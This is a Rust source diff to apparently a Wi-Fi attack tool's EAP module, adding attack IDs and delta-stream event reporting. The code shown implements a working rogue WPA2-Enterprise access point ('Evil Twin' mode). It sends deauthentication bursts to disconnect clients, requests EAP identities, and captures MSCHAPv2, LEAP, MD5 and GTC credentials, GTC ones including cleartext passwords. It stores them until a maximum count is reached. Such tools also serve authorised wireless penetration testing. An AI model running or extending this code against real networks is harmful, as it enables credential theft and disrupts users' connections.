@@ -29,8 +29,13 @@ use std::thread;
 use std::time::{Duration, Instant};
 
 use crate::adapter::SharedAdapter;
-use crate::core::{EventRing, MacAddress, TxFlags, TxOptions, TxRate};
+use crate::attacks::next_attack_id;
+use crate::core::{EventRing, MacAddress, TxOptions};
+use crate::core::chip::ChipCaps;
 use crate::store::Ap;
+use crate::store::update::{
+    AttackId, AttackType, AttackPhase, AttackEventKind, AttackResult, StoreUpdate,
+};
 use crate::protocol::eap::{self, EapType};
 use crate::protocol::frames;
 use crate::protocol::ie::{self, ApSecurity, BeaconIeConfig};
@@ -194,6 +199,19 @@ pub enum EapPhase {
     Active,
     /// Attack done (timeout, max credentials reached, or stopped).
     Done,
+}
+
+impl EapPhase {
+    /// Convert to the normalized AttackPhase for delta emission.
+    fn to_attack_phase(&self) -> AttackPhase {
+        match self {
+            Self::Idle => AttackPhase { label: "Idle", is_active: false, is_terminal: false },
+            Self::Starting => AttackPhase { label: "Starting", is_active: true, is_terminal: false },
+            Self::Listening => AttackPhase { label: "Listening", is_active: true, is_terminal: false },
+            Self::Active => AttackPhase { label: "Active", is_active: true, is_terminal: false },
+            Self::Done => AttackPhase { label: "Done", is_active: false, is_terminal: true },
+        }
+    }
 }
 
 impl Default for EapPhase {
@@ -712,17 +730,24 @@ fn run_eap_attack(
     running: &Arc<AtomicBool>,
 ) {
     let start = Instant::now();
+    let mut wait_time = Duration::ZERO;
     let tx_fb = shared.tx_feedback();
     tx_fb.reset();
+    let attack_id = next_attack_id();
     let target_bssid = target.bssid;
     let channel = target.channel;
-    // TX options optimized for range — own MAC so ACK feedback works
-    let tx_opts = TxOptions {
-        rate: if channel <= 14 { TxRate::Cck1m } else { TxRate::Ofdm6m },
-        retries: 12,
-        flags: TxFlags::WANT_ACK | TxFlags::LDPC | TxFlags::STBC,
-        ..Default::default()
-    };
+
+    // Emit AttackStarted delta
+    shared.emit_updates(vec![StoreUpdate::AttackStarted {
+        id: attack_id,
+        attack_type: AttackType::Eap,
+        target_bssid,
+        target_ssid: target.ssid.clone(),
+        target_channel: channel,
+    }]);
+    // TX options: max range + ACK feedback, chip-aware rate selection
+    let has_he = shared.caps().contains(ChipCaps::HE);
+    let tx_opts = TxOptions::max_range_ack(channel, has_he);
     let ssid = &target.ssid;
 
     // === Determine our AP BSSID ===
@@ -744,14 +769,15 @@ fn run_eap_attack(
 
     // === Lock channel ===
     if let Err(e) = shared.lock_channel(channel, "eap") {
-        push_event(events, start, EapEventKind::Error {
+        push_event(shared, events, start, EapEventKind::Error {
             message: format!("Channel lock failed: {}", e),
-        });
+        }, attack_id);
         return;
     }
-    push_event(events, start, EapEventKind::ChannelLocked { channel });
+    push_event(shared, events, start, EapEventKind::ChannelLocked { channel }, attack_id);
     if params.channel_settle > Duration::ZERO {
         thread::sleep(params.channel_settle);
+        wait_time += params.channel_settle;
     }
 
     // === Pre-build beacon IEs (WPA2-Enterprise) ===
@@ -774,11 +800,11 @@ fn run_eap_attack(
         ies
     };
 
-    set_phase(info, EapPhase::Listening);
-    push_event(events, start, EapEventKind::RogueApStarted {
+    set_phase(shared, info, EapPhase::Listening, attack_id);
+    push_event(shared, events, start, EapEventKind::RogueApStarted {
         bssid: our_bssid,
         ssid: ssid.clone(),
-    });
+    }, attack_id);
 
     if !running.load(Ordering::SeqCst) {
         shared.unlock_channel();
@@ -809,7 +835,7 @@ fn run_eap_attack(
 
         // --- Check overall timeout ---
         if params.timeout > Duration::ZERO && elapsed >= params.timeout {
-            push_event(events, start, EapEventKind::TimeoutReached { elapsed });
+            push_event(shared, events, start, EapEventKind::TimeoutReached { elapsed }, attack_id);
             break;
         }
 
@@ -838,10 +864,10 @@ fn run_eap_attack(
                     frames_sent += 1;
                     deauths_sent += 1;
                 }
-                push_event(events, start, EapEventKind::DeauthBurst {
+                push_event(shared, events, start, EapEventKind::DeauthBurst {
                     target_bssid,
                     count: params.deauth_count,
-                });
+                }, attack_id);
                 last_deauth = now;
             }
         }
@@ -858,9 +884,9 @@ fn run_eap_attack(
 
         for mac_bytes in timed_out_macs {
             if let Some(client) = clients.get_mut(&mac_bytes) {
-                push_event(events, start, EapEventKind::ClientTimeout {
+                push_event(shared, events, start, EapEventKind::ClientTimeout {
                     mac: client.mac,
-                });
+                }, attack_id);
                 // Reset to idle — they can try again
                 client.state = ClientState::Idle;
                 client.last_activity = now;
@@ -912,10 +938,10 @@ fn run_eap_attack(
                                     frames_sent += 1;
                                     auth_responses_sent += 1;
 
-                                    push_event(events, start, EapEventKind::ClientAuthenticated {
+                                    push_event(shared, events, start, EapEventKind::ClientAuthenticated {
                                         mac: sta_mac,
                                         rssi: frame.rssi,
-                                    });
+                                    }, attack_id);
                                 }
                             }
 
@@ -953,13 +979,14 @@ fn run_eap_attack(
                                 client.rssi = frame.rssi;
                                 client.last_activity = now;
 
-                                push_event(events, start, EapEventKind::ClientAssociated {
+                                push_event(shared, events, start, EapEventKind::ClientAssociated {
                                     mac: sta_mac,
                                     aid,
-                                });
+                                }, attack_id);
 
                                 // Trigger EAP: send Identity Request after brief settle
                                 thread::sleep(params.eap_start_delay);
+                                wait_time += params.eap_start_delay;
 
                                 if client.state == ClientState::Idle || client.state == ClientState::Done {
                                     client.eap_id = 1;
@@ -973,9 +1000,9 @@ fn run_eap_attack(
                                     client.state = ClientState::IdentitySent;
                                     client.last_activity = Instant::now();
 
-                                    push_event(events, start, EapEventKind::IdentityRequestSent {
+                                    push_event(shared, events, start, EapEventKind::IdentityRequestSent {
                                         mac: sta_mac,
-                                    });
+                                    }, attack_id);
 
                                     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                     i.eap_started += 1;
@@ -1011,13 +1038,14 @@ fn run_eap_attack(
                                 client.rssi = frame.rssi;
                                 client.last_activity = now;
 
-                                push_event(events, start, EapEventKind::ClientAssociated {
+                                push_event(shared, events, start, EapEventKind::ClientAssociated {
                                     mac: sta_mac,
                                     aid,
-                                });
+                                }, attack_id);
 
                                 // Trigger EAP
                                 thread::sleep(params.eap_start_delay);
+                                wait_time += params.eap_start_delay;
 
                                 if client.state == ClientState::Idle || client.state == ClientState::Done {
                                     client.eap_id = 1;
@@ -1031,9 +1059,9 @@ fn run_eap_attack(
                                     client.state = ClientState::IdentitySent;
                                     client.last_activity = Instant::now();
 
-                                    push_event(events, start, EapEventKind::IdentityRequestSent {
+                                    push_event(shared, events, start, EapEventKind::IdentityRequestSent {
                                         mac: sta_mac,
-                                    });
+                                    }, attack_id);
 
                                     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                     i.eap_started += 1;
@@ -1121,9 +1149,9 @@ fn run_eap_attack(
                             client.state = ClientState::IdentitySent;
                             client.last_activity = Instant::now();
 
-                            push_event(events, start, EapEventKind::IdentityRequestSent {
+                            push_event(shared, events, start, EapEventKind::IdentityRequestSent {
                                 mac: sta_mac,
-                            });
+                            }, attack_id);
 
                             let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                             i.eap_started += 1;
@@ -1162,11 +1190,11 @@ fn run_eap_attack(
                                 client.identity = identity.identity.clone();
                                 client.domain = identity.realm.clone().unwrap_or_default();
 
-                                push_event(events, start, EapEventKind::IdentityReceived {
+                                push_event(shared, events, start, EapEventKind::IdentityReceived {
                                     mac: sta_mac,
                                     identity: identity.identity.clone(),
                                     domain: identity.realm.clone().unwrap_or_default(),
-                                });
+                                }, attack_id);
 
                                 {
                                     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
@@ -1185,10 +1213,10 @@ fn run_eap_attack(
                                     store_credential(
                                         &cred, &mut credentials, info, events, start, params,
                                     );
-                                    push_event(events, start, EapEventKind::IdentityStored {
+                                    push_event(shared, events, start, EapEventKind::IdentityStored {
                                         mac: sta_mac,
                                         identity: client.identity.clone(),
-                                    });
+                                    }, attack_id);
 
                                     // Send EAP-Failure
                                     client.eap_id = client.eap_id.wrapping_add(1);
@@ -1201,9 +1229,9 @@ fn run_eap_attack(
                                     frames_sent += 1;
                                     client.state = ClientState::Done;
 
-                                    push_event(events, start, EapEventKind::EapFailureSent {
+                                    push_event(shared, events, start, EapEventKind::EapFailureSent {
                                         mac: sta_mac,
-                                    });
+                                    }, attack_id);
 
                                     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                     i.eap_completed += 1;
@@ -1211,9 +1239,9 @@ fn run_eap_attack(
 
                                     // Check max credentials
                                     if should_stop_for_max_creds(params, &credentials) {
-                                        push_event(events, start, EapEventKind::MaxCredentialsReached {
+                                        push_event(shared, events, start, EapEventKind::MaxCredentialsReached {
                                             count: credentials.len() as u32,
-                                        });
+                                        }, attack_id);
                                         running.store(false, Ordering::SeqCst);
                                     }
                                     continue;
@@ -1229,7 +1257,7 @@ fn run_eap_attack(
 
                                 send_challenge(
                                     shared, client, &our_bssid, method, params,
-                                    &tx_opts, events, start, &mut frames_sent,
+                                    &tx_opts, events, start, &mut frames_sent, attack_id,
                                 );
                             }
                             continue;
@@ -1245,11 +1273,11 @@ fn run_eap_attack(
                                 i.eap_naks += 1;
                             }
 
-                            push_event(events, start, EapEventKind::ClientNak {
+                            push_event(shared, events, start, EapEventKind::ClientNak {
                                 mac: sta_mac,
                                 rejected: client.offered_method.unwrap_or(EapType::MsChapV2),
                                 desired,
-                            });
+                            }, attack_id);
 
                             // Evil Twin mode: try client's preferred method
                             if params.mode == EapAttackMode::EvilTwin {
@@ -1260,13 +1288,13 @@ fn run_eap_attack(
 
                                         send_challenge(
                                             shared, client, &our_bssid, new_method, params,
-                                            &tx_opts, events, start, &mut frames_sent,
+                                            &tx_opts, events, start, &mut frames_sent, attack_id,
                                         );
 
-                                        push_event(events, start, EapEventKind::MethodRetried {
+                                        push_event(shared, events, start, EapEventKind::MethodRetried {
                                             mac: sta_mac,
                                             new_method,
-                                        });
+                                        }, attack_id);
                                     }
                                 }
                             }
@@ -1293,10 +1321,10 @@ fn run_eap_attack(
                                     &cred, &mut credentials, info, events, start, params,
                                 );
 
-                                push_event(events, start, EapEventKind::MsChapV2Captured {
+                                push_event(shared, events, start, EapEventKind::MsChapV2Captured {
                                     mac: sta_mac,
                                     identity: client.identity.clone(),
-                                });
+                                }, attack_id);
 
                                 {
                                     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
@@ -1315,16 +1343,16 @@ fn run_eap_attack(
                                 frames_sent += 1;
                                 client.state = ClientState::Done;
 
-                                push_event(events, start, EapEventKind::EapFailureSent { mac: sta_mac });
+                                push_event(shared, events, start, EapEventKind::EapFailureSent { mac: sta_mac }, attack_id);
 
                                 let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                 i.eap_completed += 1;
                                 i.clients_completed += 1;
 
                                 if should_stop_for_max_creds(params, &credentials) {
-                                    push_event(events, start, EapEventKind::MaxCredentialsReached {
+                                    push_event(shared, events, start, EapEventKind::MaxCredentialsReached {
                                         count: credentials.len() as u32,
-                                    });
+                                    }, attack_id);
                                     running.store(false, Ordering::SeqCst);
                                 }
                             }
@@ -1352,10 +1380,10 @@ fn run_eap_attack(
                                     &cred, &mut credentials, info, events, start, params,
                                 );
 
-                                push_event(events, start, EapEventKind::LeapCaptured {
+                                push_event(shared, events, start, EapEventKind::LeapCaptured {
                                     mac: sta_mac,
                                     identity: client.identity.clone(),
-                                });
+                                }, attack_id);
 
                                 {
                                     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
@@ -1365,13 +1393,13 @@ fn run_eap_attack(
 
                                 finish_client(
                                     shared, client, &sta_mac, &our_bssid, eap_id,
-                                    &tx_opts, events, start, &mut frames_sent, info,
+                                    &tx_opts, events, start, &mut frames_sent, info, attack_id,
                                 );
 
                                 if should_stop_for_max_creds(params, &credentials) {
-                                    push_event(events, start, EapEventKind::MaxCredentialsReached {
+                                    push_event(shared, events, start, EapEventKind::MaxCredentialsReached {
                                         count: credentials.len() as u32,
-                                    });
+                                    }, attack_id);
                                     running.store(false, Ordering::SeqCst);
                                 }
                             }
@@ -1398,11 +1426,11 @@ fn run_eap_attack(
                                     &cred, &mut credentials, info, events, start, params,
                                 );
 
-                                push_event(events, start, EapEventKind::GtcCaptured {
+                                push_event(shared, events, start, EapEventKind::GtcCaptured {
                                     mac: sta_mac,
                                     identity: client.identity.clone(),
                                     password,
-                                });
+                                }, attack_id);
 
                                 {
                                     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
@@ -1412,13 +1440,13 @@ fn run_eap_attack(
 
                                 finish_client(
                                     shared, client, &sta_mac, &our_bssid, eap_id,
-                                    &tx_opts, events, start, &mut frames_sent, info,
+                                    &tx_opts, events, start, &mut frames_sent, info, attack_id,
                                 );
 
                                 if should_stop_for_max_creds(params, &credentials) {
-                                    push_event(events, start, EapEventKind::MaxCredentialsReached {
+                                    push_event(shared, events, start, EapEventKind::MaxCredentialsReached {
                                         count: credentials.len() as u32,
-                                    });
+                                    }, attack_id);
                                     running.store(false, Ordering::SeqCst);
                                 }
                             }
@@ -1447,10 +1475,10 @@ fn run_eap_attack(
                                     &cred, &mut credentials, info, events, start, params,
                                 );
 
-                                push_event(events, start, EapEventKind::Md5Captured {
+                                push_event(shared, events, start, EapEventKind::Md5Captured {
                                     mac: sta_mac,
                                     identity: client.identity.clone(),
-                                });
+                                }, attack_id);
 
                                 {
                                     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
@@ -1460,13 +1488,13 @@ fn run_eap_attack(
 
                                 finish_client(
                                     shared, client, &sta_mac, &our_bssid, eap_id,
-                                    &tx_opts, events, start, &mut frames_sent, info,
+                                    &tx_opts, events, start, &mut frames_sent, info, attack_id,
                                 );
 
                                 if should_stop_for_max_creds(params, &credentials) {
-                                    push_event(events, start, EapEventKind::MaxCredentialsReached {
+                                    push_event(shared, events, start, EapEventKind::MaxCredentialsReached {
                                         count: credentials.len() as u32,
-                                    });
+                                    }, attack_id);
                                     running.store(false, Ordering::SeqCst);
                                 }
                             }
@@ -1497,9 +1525,9 @@ fn run_eap_attack(
             i.credentials = credentials.clone();
             i.credentials_total = credentials.len() as u32;
 
-            let secs = i.elapsed.as_secs_f64();
-            if secs > 0.0 {
-                i.frames_per_sec = frames_sent as f64 / secs;
+            let active_secs = i.elapsed.saturating_sub(wait_time).as_secs_f64();
+            if active_secs > 0.0 {
+                i.frames_per_sec = frames_sent as f64 / active_secs;
             }
             i.tx_feedback = tx_fb.snapshot();
         }
@@ -1513,11 +1541,25 @@ fn run_eap_attack(
         i.tx_feedback = tx_fb.snapshot();
     }
 
+    // Emit final counters
+    emit_counters(shared, attack_id, info, start, &tx_fb);
+
     // === Cleanup ===
-    push_event(events, start, EapEventKind::AttackComplete {
+    push_event(shared, events, start, EapEventKind::AttackComplete {
         credentials_total: credentials.len() as u32,
         elapsed: start.elapsed(),
-    });
+    }, attack_id);
+
+    // Emit AttackComplete with final results
+    shared.emit_updates(vec![StoreUpdate::AttackComplete {
+        id: attack_id,
+        attack_type: AttackType::Eap,
+        result: AttackResult::Eap {
+            credentials_total: credentials.len() as u32,
+            credentials,
+        },
+    }]);
+
     shared.unlock_channel();
 }
 
@@ -1570,6 +1612,7 @@ fn send_challenge(
     events: &Arc<EventRing<EapEvent>>,
     start: Instant,
     frames_sent: &mut u64,
+    attack_id: AttackId,
 ) {
     let eap_pkt = match method {
         EapType::MsChapV2 => {
@@ -1604,10 +1647,10 @@ fn send_challenge(
     client.state = ClientState::ChallengeSent;
     client.last_activity = Instant::now();
 
-    push_event(events, start, EapEventKind::ChallengeSent {
+    push_event(shared, events, start, EapEventKind::ChallengeSent {
         mac: client.mac,
         method,
-    });
+    }, attack_id);
 }
 
 /// Send EAP-Failure and mark client as done.
@@ -1622,6 +1665,7 @@ fn finish_client(
     start: Instant,
     frames_sent: &mut u64,
     info: &Arc<Mutex<EapInfo>>,
+    attack_id: AttackId,
 ) {
     client.eap_id = client.eap_id.wrapping_add(1);
     let fail_pkt = eap::build_eap_failure(eap_id);
@@ -1631,7 +1675,7 @@ fn finish_client(
     *frames_sent += 1;
     client.state = ClientState::Done;
 
-    push_event(events, start, EapEventKind::EapFailureSent { mac: *sta_mac });
+    push_event(shared, events, start, EapEventKind::EapFailureSent { mac: *sta_mac }, attack_id);
 
     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
     i.eap_completed += 1;
@@ -1682,19 +1726,64 @@ fn check_probe_ssid(frame_data: &[u8], our_ssid: &str) -> bool {
 }
 
 /// Push an event with auto-incrementing seq and timestamp.
-fn push_event(events: &Arc<EventRing<EapEvent>>, start: Instant, kind: EapEventKind) {
+fn push_event(
+    shared: &SharedAdapter,
+    events: &Arc<EventRing<EapEvent>>,
+    start: Instant,
+    kind: EapEventKind,
+    attack_id: AttackId,
+) {
     let seq = events.seq() + 1;
-    events.push(EapEvent {
+    let timestamp = start.elapsed();
+
+    // Emit into the delta stream
+    shared.emit_updates(vec![StoreUpdate::AttackEvent {
+        id: attack_id,
         seq,
-        timestamp: start.elapsed(),
-        kind,
-    });
+        timestamp,
+        event: AttackEventKind::Eap(kind.clone()),
+    }]);
+
+    // Push to legacy EventRing (still consumed by CLI polling path)
+    events.push(EapEvent { seq, timestamp, kind });
 }
 
 /// Update attack phase.
-fn set_phase(info: &Arc<Mutex<EapInfo>>, phase: EapPhase) {
+fn set_phase(
+    shared: &SharedAdapter,
+    info: &Arc<Mutex<EapInfo>>,
+    phase: EapPhase,
+    attack_id: AttackId,
+) {
+    // Emit phase change into the delta stream
+    shared.emit_updates(vec![StoreUpdate::AttackPhaseChanged {
+        id: attack_id,
+        phase: phase.to_attack_phase(),
+    }]);
+
+    // Update legacy Info struct (still consumed by CLI polling path)
     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
     i.phase = phase;
+    i.elapsed = i.start_time.elapsed();
+}
+
+/// Emit counter snapshot into the delta stream.
+fn emit_counters(
+    shared: &SharedAdapter,
+    attack_id: AttackId,
+    info: &Arc<Mutex<EapInfo>>,
+    start: Instant,
+    tx_fb: &Arc<crate::core::TxFeedback>,
+) {
+    let info = info.lock().unwrap_or_else(|e| e.into_inner());
+    shared.emit_updates(vec![StoreUpdate::AttackCountersUpdate {
+        id: attack_id,
+        frames_sent: info.frames_sent,
+        frames_received: info.frames_received,
+        frames_per_sec: info.frames_per_sec,
+        elapsed: start.elapsed(),
+        tx_feedback: tx_fb.snapshot(),
+    }]);
 }
 
 /// Generate random bytes using a simple PRNG (cryptographic quality not required
